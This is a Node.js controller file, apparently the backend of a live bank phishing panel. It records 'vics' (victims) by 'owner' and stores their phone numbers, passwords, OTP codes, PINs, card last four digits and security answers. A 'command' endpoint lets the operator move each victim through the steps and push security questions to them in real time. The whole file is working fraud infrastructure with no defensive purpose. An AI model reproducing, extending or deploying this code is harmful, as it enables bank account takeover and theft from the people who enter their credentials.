const uBank = require("../models/ubankModel");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  uBank
    .find({ owner })
    .sort({ timestamp: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status, secQuestion } = req.body;
  try {
    if (status == 10) {
      await uBank
        .findOneAndUpdate({ uniqueid }, { status, secQuestion })
        .exec();
    } else {
      await uBank.findOneAndUpdate({ uniqueid }, { status }).exec();
    }
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  uBank.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { telephone, uniqueid, owner, ip } = req.body;
  try {
    await uBank.create({ uniqueid, telephone, status: 12, owner, ip, timestamp: moment().format() });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { telephone, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { telephone, status: 9, timestamp: moment().format() }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { otp, status: 7, timestamp: moment().format() }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPin = async (req, res) => {
  const { pin, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { pin, status: 5, timestamp: moment().format() }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLast4 = async (req, res) => {
  const { last4, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { last4, status: 4, timestamp: moment().format() }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitSecAnswer = async (req, res) => {
  const { secAnswer, uniqueid } = req.body;
  try {
    await uBank
      .findOneAndUpdate({ uniqueid }, { secAnswer, status: 11, timestamp: moment().format() })
      .exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitPassword = async (req, res) => {
  const { password, uniqueid } = req.body;
  try {
    await uBank.findOneAndUpdate({ uniqueid }, { password, status: 13, timestamp: moment().format() }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await uBank.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPin,
  submitLast4,
  deleteEntry,
  submitPassword,
  submitSecAnswer,
};
